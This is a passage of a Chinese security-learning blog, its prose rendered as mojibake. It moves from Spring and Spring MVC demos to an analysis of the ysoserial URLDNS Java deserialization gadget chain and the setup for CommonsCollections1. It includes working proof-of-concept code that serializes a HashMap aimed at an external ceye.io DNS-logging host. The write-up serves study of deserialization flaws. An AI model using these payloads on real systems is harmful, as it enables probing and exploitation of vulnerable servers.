·å°±ä¼šåœ¨é€‰å®šçš„åŒ…é‡Œè‡ªåŠ¨å¯»æ‰¾beanäº†ã€‚ åŒæ ·æˆ‘ä»¬è¿˜å¯ä»¥è‡ªåŠ¨è£…é…bean. TextEditor 12345678910111213141516171819202122package top.bycsec;public class TextEditor &#123; private SpellChecker spellChecker; private String name; public void setSpellChecker( SpellChecker spellChecker ) &#123; this.spellChecker = spellChecker; &#125; public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; SpellChecker 12345678910package top.bycsec;public class SpellChecker &#123; public SpellChecker()&#123; System.out.println(\"Inside SpellChecker constructor.\" ); &#125; public void checkSpelling() &#123; System.out.println(\"Inside checkSpelling.\" ); &#125;&#125; MainApp 123456789101112package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); TextEditor te = (TextEditor) context.getBean(\"textEditor\"); te.spellCheck(); &#125;&#125; beans.xml 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"top.bycsec.TextEditor\" autowire=\"byName\"&gt; &lt;property name=\"name\" value=\"byc_404\" /&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"top.bycsec.SpellChecker\" /&gt;&lt;/beans&gt; æ³¨æ„è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨è‡ªåŠ¨è£…é…,ä¹Ÿå°±æ˜¯é…ç½®beançš„autowireå±æ€§ã€‚æ¯”å¦‚æ­¤å¤„çš„byNameå°±æ˜¯æŒ‡ï¼š æ ¹æ® Property çš„ name è‡ªåŠ¨è£…é…ï¼Œå¦‚æœä¸€ä¸ª Bean çš„ name å’Œå¦ä¸€ä¸ª Bean ä¸­çš„ Property çš„ name ç›¸åŒï¼Œåˆ™è‡ªåŠ¨è£…é…è¿™ä¸ª Bean åˆ° Property ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬textEditorè¿™ä¸ªbeanå®šä¹‰è®¾ç½®ä¸ºè‡ªåŠ¨è£…é…byNameï¼Œå¹¶ä¸”å®ƒåŒ…å«spellCheckerå±æ€§ï¼ˆå³å®ƒæœ‰ä¸€ä¸ª setSpellChecker(â€¦) æ–¹æ³•ï¼‰ï¼Œé‚£ä¹ˆSpringå°±ä¼šæŸ¥æ‰¾å®šä¹‰åä¸ºspellCheckerçš„beanï¼Œå¹¶ä¸”ç”¨å®ƒæ¥è®¾ç½®è¿™ä¸ªå±æ€§ å¦‚æœæˆ‘ä»¬ä¸ç”¨è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆbeans.xmlä¸­çš„é…ç½®å°±éœ€è¦é¢å¤–è®¾ç½®property 1234&lt;bean id=\"textEditor\" class=\"top.bycsec.TextEditor\"&gt; &lt;property name=\"spellChecker\" ref=\"spellChecker\" /&gt; &lt;property name=\"name\" value=\"byc_404\" /&gt;&lt;/bean&gt; åŒç†ã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨byTypeç­‰autowireå±æ€§å€¼æ¥è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚ ä»Šå¤©å…ˆçœ‹åˆ°è¿™ã€‚springçš„å†…å®¹è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ SpringMVCä»Šå¤©ç®€å•å†™ä¸ªspringmvcçš„demoã€‚å…¶å®çœ‹äº†çœ¼å»–é›ªå³°è€å¸ˆçš„springæ•™ç¨‹ã€‚å‘ç°springçš„é¡¹ç›®åŸºæœ¬éƒ½æ˜¯mavenæ„å»ºçš„ã€‚å®é™…ä¸Šæˆ‘ä»¬å°±ç®—å•çº¯ä½¿ç”¨ideaä¸­springmvcå¼€å‘ï¼Œä¹Ÿå¯ä»¥åŠ å…¥mavenç»“æ„ã€‚ æˆ‘ä¸ªäººçœ‹äº†ä¸‹ç½‘ä¸Šcsdnçš„å‡ ç§å†™æ³•ã€‚æœ‰ç‚¹æƒŠè®¶æœ‰çš„æ ¹æœ¬æ²¡æœ‰å†™å‡ºmvcçš„ä½œç”¨,æœ‰çš„æ–¹æ³•å®Œå…¨æ‹˜æ³¥äºåŸæ¥servletçš„å†™æ³•,æ²¡æœ‰ç”¨ä¸Šspringè‡ªå·±çš„ä¾èµ–ã€‚æœ€åæ‰¾åˆ°ä¸€ä¸ªé˜¿é‡Œäº‘çš„demoæ‰çœŸæ­£ç†è§£äº†å…¶ç»“æ„ã€‚ä¸‹é¢æ¥å®é™…æ“ä½œä¸‹ã€‚ é¦–å…ˆideaåˆ›å»ºspringmvcé¡¹ç›®ã€‚å½“ç„¶åˆšåˆšæåˆ°äº†åˆ›å»ºmavené¡¹ç›®ç„¶åå¼•å…¥springä¾èµ–ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œæˆ‘ä»¬å°±æš‚ä¸”å…ˆä½¿ç”¨ideaæ¥å¸®åŠ©æˆ‘ä»¬ç›´æ¥å¤„ç†å¥½springçš„ä¾èµ–å§ã€‚ åˆšåˆ›å»ºå®Œé¡¹ç›®é¦–å…ˆè¦æ³¨æ„ä¸€ç‚¹ã€‚éœ€è¦åœ¨ProjectStructure =&gt; Artifact ä¸­å°†ä¸¤ä¸ªspringçš„ä¾èµ–åŠ å…¥åˆ°WEB-INF/libä¸­ã€‚å¦åˆ™å¾…ä¼šæˆ‘ä»¬ä½¿ç”¨tomcatéƒ¨ç½²æ—¶ä¼šæŠ¥é”™ã€‚ æ¥ä¸‹æ¥å…ˆç”¨ä¸åŠ æ³¨è§£çš„æ–¹æ³•å†™ä¸€ä¸ªclassã€‚ 12345678910111213141516171819package top.bycsec;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.mvc.Controller;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class Helloworld implements Controller &#123; @Override public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception &#123; ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(\"name\",\"byc_404\"); modelAndView.setViewName(\"hello\"); return modelAndView; &#125;&#125; åº•ä¸‹addObjectæ˜¯åŠ è½½æ¨¡å‹æ•°æ®ã€‚setViewNameåˆ™æ˜¯é€‰å®šæ¨¡å‹è§†å›¾ã€‚è¿™é‡Œè§†å›¾ä¸ä½¿ç”¨hello.jspè€Œæ˜¯helloæ˜¯æ–¹ä¾¿ä¹¦å†™ã€‚æˆ‘ä»¬åé¢ç›´æ¥åœ¨é…ç½®ä¸­å®šä¹‰åç¼€å³å¯ã€‚ 12345678910&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;%@ page isELIgnored=\"false\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello $&#123;name&#125;&lt;/body&gt;&lt;/html&gt; hello.jsp ä½¿ç”¨SpELè¡¨è¾¾å¼ã€‚å³è·å–æˆ‘ä»¬åˆšåˆšçš„æ¨¡å‹æ•°æ®è¾“å‡ºåˆ°è§†å›¾ã€‚ç„¶åæ˜¯é¡¹ç›®åˆ›å»ºæ—¶è‡ªåŠ¨ç”Ÿæˆçš„dispatcher-servlet.xmlã€‚è¿™é‡Œå¯ä»¥ä¿®æ”¹æˆ‘ä»¬beançš„ç›¸å…³å‚æ•°ã€‚æ¯”å¦‚æ­¤å¤„è®¾ç½®è·¯ç”±/helloworldã€‚åˆ©ç”¨beanidè®©å…¶å¯¹åº”classä¸ºHelloWorld.ä»¥åŠè§†å›¾æ˜¯åœ¨webæ ¹ç›®å½•ä¸‹æ‰¾åç¼€ä¸ºjspçš„æ–‡ä»¶ã€‚é…ç½®æ–‡ä»¶beanéƒ¨åˆ†å¦‚ä¸‹ã€‚ 12345678910111213141516&lt;bean id=\"handlerMapping\" class=\"org.springframework.web.servlet.handler.SimpleUrlHandlerMapping\"&gt; &lt;property name=\"mappings\"&gt; &lt;props&gt; &lt;prop key=\"/helloworld\"&gt;testHandler&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"testHandler\" class=\"top.bycsec.Helloworld\"&gt;&lt;/bean&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\"&gt; &lt;value&gt;/&lt;/value&gt; &lt;/property&gt; &lt;property name=\"suffix\"&gt; &lt;value&gt;.jsp&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; ä¹‹ååŠ è½½tomcaté…ç½®è·‘èµ·æ¥å³å¯ã€‚è®¿é—®æ ¹ç›®å½•æ˜¯index.jspå†…å®¹ã€‚è®¿é—®/helloworldåˆ™æ˜¯hello.jsp å½“ç„¶ã€‚è¿™ç§å†™æ³•è‚¯å®šæ˜¯éº»çƒ¦äº†ã€‚åˆšå¥½æ˜¨å¤©å­¦è¿‡äº†spring ä¸­è‡ªåŠ¨è£…è½½beançš„ç”¨æ³•ã€‚é‚£ä¹ˆæ­¤å¤„å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ³¨è§£+é…ç½®è‡ªåŠ¨è£…è½½bean æ–°å†™ä¸€ä¸ªAnnotationHandlerç±»ã€‚è¿™é‡Œä½¿ç”¨æ³¨è§£@Controllerå°†å…¶ç½®ä¸ºæ§åˆ¶å™¨ã€‚åŒæ—¶è®¾å®šå…¶è·¯ç”±ä¸º/mdoelã€‚æ•°æ®ä¸è§†å›¾è·Ÿåˆšåˆšå·®ä¸å¤šã€‚ 123456789101112131415161718package top.bycsec;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;@Controllerpublic class AnnotationHandler &#123; @RequestMapping(\"/model\") public ModelAndView modelAndViewTest()&#123; ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(\"name\",\"byc_404\"); modelAndView.setViewName(\"show\"); return modelAndView; &#125;&#125; show.jsp 12345678910&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;%@ page isELIgnored=\"false\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Model&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Testing model by $&#123;name&#125;&lt;/body&gt;&lt;/html&gt; dispatcher-servlet.xml 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;context:component-scan base-package=\"top.bycsec\"&gt;&lt;/context:component-scan&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\"&gt; &lt;value&gt;/&lt;/value&gt; &lt;/property&gt; &lt;property name=\"suffix\"&gt; &lt;value&gt;.jsp&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; ç›´æ¥æ‰«ætop.bycsecåŒ…ååˆ†æ–¹ä¾¿ã€‚ç°åœ¨æˆ‘ä»¬è®¿é—®/modelè·¯ç”±æœ€ç»ˆé¡¹ç›®è·¯å¾„ å¦‚æœè¦åœ¨ä¸Šé¢åŸºç¡€ä¸Šæ¥å—å‚æ•°æˆ–è€…è®¾ç½®è·¯ç”±åŸºæœ¬è·Ÿservletå·®ä¸å¤š 1234567891011121314151617181920212223@Controller@RequestMapping(\"/user\")public class UserController &#123; // å®é™…URLæ˜ å°„æ˜¯/user/profile @GetMapping(\"/profile\") public ModelAndView profile() &#123; ... &#125; // å®é™…URLæ˜ å°„æ˜¯/user/changePassword @GetMapping(\"/changePassword\") public ModelAndView changePassword() &#123; ... &#125; @PostMapping(\"/signin\") public ModelAndView doSignin( @RequestParam(\"email\") String email, @RequestParam(\"password\") String password, HttpSession session) &#123; ... &#125;&#125; å‡å¦‚ç¼–å†™çš„æ˜¯å¤§é‡æ¥å£çš„ä»£ç (rest api)ã€‚springè¿˜æä¾›äº†@RestControlleræ¥ä»£æ›¿@Controller.è¿™æ ·æ¥å£çš„æ–¹æ³•è‡ªåŠ¨å˜æˆapiæ–¹æ³•ã€‚æ•°æ®ä¹Ÿæ˜¯restapiçš„jsonæ•°æ®ã€‚ Auditè¿™ä¸€éƒ¨åˆ†ç”¨äºå­¦ä¹ javaä»£ç å®¡è®¡ä¸­ä¸€äº›å¸¸è§æ¼æ´çš„æ·±å±‚åŸç†ã€‚æ¯”å¦‚ä¹‹å‰ååºåˆ—åŒ–ä¸­åˆ©ç”¨é“¾çš„æ·±å±‚åŸå› è¿˜æ²¡æœ‰å…¨éƒ¨å­¦æ¸…æ¥šã€‚ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„payloadç¼–å†™ä¹Ÿè¿˜éœ€è¦åŸºç¡€çŸ¥è¯†ä½œä¸ºåº•å±‚æ”¯æŒã€‚ çœŸæ­£æ¥è§¦äº†å®æˆ˜æ‰ä¼šå‘ç°javaåœ¨ç°åœ¨ä»æ—§æ˜¯å»ºç«™çš„é¦–é€‰ï¼Œå¹¶ä¸”å¾€å¾€å¯ä»¥æ‹¿åˆ°æƒé™è¾ƒé«˜çš„shell.ä¹Ÿå¹¸å¥½æœ€è¿‘æ¥è§¦javaç›¸å¯¹æ›´å¤šäº†ç‚¹ï¼Œæ‰€ä»¥æ‰æœ‰èƒ†é‡å»æ¢ç©¶è¿™äº›æ¼æ´åˆ©ç”¨çš„åº•å±‚ã€‚ deserialization gadgetså…ˆä»ysoserialpayloadåˆ©ç”¨é“¾çš„åŸç†å¼€å§‹å®¡è®¡ã€‚ æ ¹æ®æˆ‘ä»¬æœ€æ—©å­¦ä¹ åˆ°çš„javaååºåˆ—åŒ–åŸç†ã€‚æˆ‘ä»¬çŸ¥é“,åºåˆ—åŒ–åˆ©ç”¨ç±»å¿…é¡»æ˜¯å®ç°äº†Serializableçš„ã€‚è¿™äº›éƒ½æ˜¯payloadå¯è¡Œçš„å¿…è¦æ¡ä»¶ã€‚æ‰€ä»¥åç»­è¿™ç§ç»†èŠ‚éƒ½ä¸å¿…æã€‚ URLDNS URLDNSå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ¼æ´ã€‚åŸå› å¾ˆç®€å•:1.ä¾èµ–åŸç”Ÿç±»Hashmap2.ä¸ä¾èµ–jdkç‰ˆæœ¬ æˆ‘ä»¬çœ‹çœ‹Hashmapç±»ã€‚å®ƒå®ç°äº†readObjectæ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\"Illegal load factor: \" + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;\"rawtypes\",\"unchecked\"&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; å…³é”®åœ¨æœ€åä¸€è¡Œçš„putvalã€‚æˆ‘ä»¬å…ˆçœ‹å‘putvalä¸­ä½¿ç”¨äº†çš„hashæ–¹æ³• é‡Œé¢hashCodeæ–¹æ³•å–å†³äºä½ çš„keyçš„ç±»ã€‚æ­¤å¤„æ˜¯java.net.URLç±»ã€‚ 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; è€Œè·Ÿè¿›è¿™é‡Œçš„handlerå‘ç°è°ƒç”¨çš„æ˜¯java.net.URLStreamHandlerçš„hashCodeã€‚çœ‹åˆ°getHostAddress.å°±èƒ½æ˜ç™½æ­¤å¤„è‚¯å®šæ˜¯å¯¹åŸŸåè¿›è¡Œäº†è§£æã€‚æ‰€ä»¥ä¼šå‘å‡ºDNSè¯·æ±‚ã€‚ ä¸è¿‡ã€‚URLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚hashCodeæ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.è€Œurlç±»ä¸­å®ƒæ˜¯é»˜è®¤ä¸º-1çš„ã€‚ åˆšåˆšæˆ‘ä»¬è¯´ï¼Œè§¦å‘ç‚¹åœ¨putValé‚£é‡Œã€‚å®ƒçš„keyæ˜¯é€šè¿‡readObjectè¯»å–å‡ºæ¥çš„ã€‚é‚£è¯´æ˜æˆ‘ä»¬çš„keyå†™å…¥æ—¶æ˜¯é€šè¿‡writeObjectå†™å…¥çš„ã€‚æŒ‰ç…§è¿™ä¸ªçº¿è·¯è·Ÿä¸‹å»,ä¼šå‘ç°keyå€¼æœ€ç»ˆæ¥è‡ªHashMapä¸­tableçš„å€¼ã€‚è€ŒHashMap ä¸­çš„tableå³hashè¡¨æ˜¯é€šè¿‡hashmap.putæ¥å†™å…¥æ•°æ®çš„ã€‚ 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; è¿™é‡Œä¹Ÿè°ƒç”¨äº†hashã€‚é‚£ä¹ˆè¯´æ˜è¿™é‡Œä¹Ÿä¼šè§¦å‘dnsè¯·æ±‚ æˆ‘ä»¬å¯ä»¥å†™ä¸ªdemoURLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚hashCodeæ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.æ‰€ä»¥æœ¬åœ°å†™è¦å°†putçš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸º-1æ‰ä¼šå‘å‡ºdnsè¯·æ±‚ã€‚ 1234567891011121314package top.bycsec;import java.util.HashMap;import java.net.URL;public class exp &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.xxx.ceye.io/\"); map.put(url,-1); &#125;&#125; æˆ‘ä»¬å¦‚æœåªæƒ³åœ¨å¯¹æ–¹æœºå™¨ä¸Šæ£€æµ‹æ˜¯å¦äº§ç”Ÿdnsè¯·æ±‚ã€‚é‚£ä¹ˆå¿…é¡»å¾—è§„é¿æ‰Hashmap.putè¿™ä¸€æ¬¡è°ƒç”¨æ—¶é‡Œé¢åšå‡ºçš„dnsè¯·æ±‚ã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ã€‚é‚£å°±æ˜¯åœ¨putå‰ä¿®æ”¹URLçš„hashCodeä¸ºå…¶ä»–ä»»æ„å€¼ï¼Œå°±å¯ä»¥åœ¨putæ—¶ä¸è§¦å‘dnsæŸ¥è¯¢ è¿™ä¸€æ­¥å¯ä»¥é€šè¿‡åå°„æ¥è¾¾æˆã€‚ 1234567891011121314151617import java.lang.reflect.Field;import java.util.HashMap;import java.net.URL;public class exp &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.59fevd.ceye.io/\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,123); System.out.println(url.hashCode()); map.put(url,123); &#125;&#125; æ­¤æ—¶è°ƒç”¨urlçš„hashCodeç»“æœä¼šè¿”å›123.ä¹Ÿå°±æ˜¯ç›´æ¥è¿”å›äº†æˆ‘ä»¬è®¾ç½®çš„å€¼,é¿å…äº†dnsæŸ¥è¯¢ã€‚ hashCode è¿™ä¸ªå±æ€§ä¸æ˜¯ transient çš„,è€Œæ˜¯privateçš„ã€‚æ‰€ä»¥æ”¾è¿›å»åè®¾å› -1, è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šé‡æ–°è®¡ç®— hashCode å› æ­¤ã€‚æˆ‘ä»¬å®é™…çš„pocå¦‚ä¸‹ 123456789101112131415161718192021222324package top.bycsec;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; HashMap map = new HashMap(); URL url = new URL(\"http://byc.59fevd.ceye.io/\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 123); map.put(url, \"byc_404\"); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"out.bin\")); oos.writeObject(map); oos.close(); &#125;&#125; è¿™æ ·å°±æˆåŠŸå°†åºåˆ—åŒ–æ•°æ®å†™å…¥out.bin,å¹¶ä¸”æ²¡æœ‰æœ¬åœ°å‘å‡ºdnsè¯·æ±‚ã€‚ç„¶åæˆ‘ä»¬æ¨¡æ‹ŸçœŸå®åœºæ™¯è§¦å‘ 1234567891011121314package top.bycsec;import java.io.FileInputStream;import java.io.ObjectInputStream;public class exp &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"out.bin\")); ois.readObject(); ois.close(); &#125;&#125; åœ¨p1g3å¸ˆå‚…çš„æ–‡ç« é‡Œè¿˜å¯¹ysoserialçš„payloadè¿›è¡Œäº†åˆ†æã€‚æˆ‘ä»¬ä¸å¦¨ä¹Ÿçœ‹çœ‹ysoçš„jaråŒ…ä¸­æ˜¯å¦‚ä½•ä¹¦å†™çš„(å…¶å®ç›´æ¥å»çœ‹githubä¸Šæºç å¯ä»¥é…åˆæ³¨é‡Šæ›´å¥½é˜…è¯») 1234567891011121314151617181920public Object getObject(String url) throws Exception &#123; URLStreamHandler handler = new URLDNS.SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL((URL)null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, \"hashCode\", -1); return ht;&#125;static class SilentURLStreamHandler extends URLStreamHandler &#123; SilentURLStreamHandler() &#123; &#125; protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125;&#125; jaråŒ…åç¼–è¯‘çœ‹ä¸å‡ºæç¤ºã€‚æˆ‘ä»¬åœ¨githubæºç ä¸Šåˆ™å¯ä»¥æ‰¾åˆ°ä½œè€…çš„è¯´æ³• 123//Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.URLStreamHandler handler = new SilentURLStreamHandler(); é…åˆä¸Šé¢çš„æºç ã€‚æˆ‘ä»¬çŸ¥é“è¿™é‡Œå®ƒæ–°å»ºäº†ä¸€ä¸ªå­ç±»SilentURLStreamHandlerç»§æ‰¿URLStreamHandlerã€‚é‚£å½“å®ƒåœ¨URLDNSpayloadé‡Œè°ƒç”¨putæ—¶æ˜¯ç›´æ¥è°ƒç”¨è‡ªå®šä¹‰çš„getHostAddress.è¿™ä¸ªæ–¹æ³•è¿”å›null. è€Œå½“ååºåˆ—åŒ–æ‰§è¡Œæ—¶,å› ä¸ºè¿™é‡Œçš„SilentURLStreamHandlerå±æ€§è¢«è®¾ç½®ä¸ºtransientï¼Œè€Œè¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerã€‚ åˆ°æ­¤ä¸ºæ­¢ã€‚æˆ‘ä»¬å®Œæˆäº†æ•´æ¡urldnsé“¾çš„åˆ†æã€‚gadgetså¦‚ä¸‹ 12345HashMap#readObject HashMap#hash URL#hashCode URLStreamHandler#hashCode URLStreamHandler#getHostAddress CommonCollections1 å…ˆè¯´ä¸‹ç¯å¢ƒçš„é…ç½®é—®é¢˜ã€‚å› ä¸ºccé“¾å­å¥½å‡ æ¡éƒ½åªèƒ½ç”¨åœ¨jdk1.7ä¸‹äº†æ‰€ä»¥å¾—å¼„ä¸ªjdk1.7çš„ç¯å¢ƒã€‚å¼€å§‹æ‰“ç®—ç”¨kaliè™šæ‹Ÿæœºç°æˆçš„çš„jvmé‡Œçš„1.7,ç»“æœå› ä¸ºå®˜æ–¹åº“å·²ç»æ²¡æœ‰openjdk7äº†ï¼Œideaè¯†åˆ«ä¸åˆ°ã€‚æ‰€ä»¥åªå¥½åˆä¸‹äº†ä¸€ä¸ªjdk1.7. å› ä¸ºåªæ˜¯é¡¹ç›®ç”¨ï¼Œæ‰€ä»¥ä¸éœ€è¦æ·»åŠ ç¯å¢ƒå˜é‡ä»€ä¹ˆçš„å°±å¯ä»¥äº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ideaé¡¹ç›®åˆ‡æ¢jdkç‰ˆæœ¬çš„è¯,å°¤å…¶å¯¹äºæˆ‘ä»¬mavené¡¹ç›®è€Œè¨€,ä¸€å®šè¦æŠŠè®¾ç½®é‡Œæ‰€æœ‰é»˜è®¤å€¼éƒ½æ”¹ä¸ºjdk1.7.åŒ…æ‹¬ï¼špom.xmlé‡Œjava versionä¸maven ç¼–è¯‘version;project structureé‡Œproject sdk ä»¥åŠmodules;Language level;java Compiler version å…¨éƒ¨è°ƒæ•´ä¸º1.7æ‰èƒ½ä¸å‡ºé”™ã€‚å¦åˆ™ä¼šåœ¨ç¼–è¯‘æ—¶æŠ¥æ— æ•ˆçš„æºä»¥åŠç¼–è¯‘å®Œåæ— æ•ˆçš„ç›®æ ‡å‘è¡Œç‰ˆè¿™ä¸¤ç§é”™ã€‚ä¿®æ”¹å¥½åå°±æ²¡æœ‰ä»€ä¹ˆå¥½æ‹…å¿ƒçš„äº†ã€‚å¼€å§‹mavenå¯¼åº“å®¡è®¡å§ã€‚pom.xml 12345678910111213141516171819202122232425&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt; &lt;java.version&gt;1.7&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; é¦–å…ˆæ˜¯ä¸€ä¸ªå…³äºåŠ¨æ€ä»£ç†çš„ä¾‹å­ã€‚ 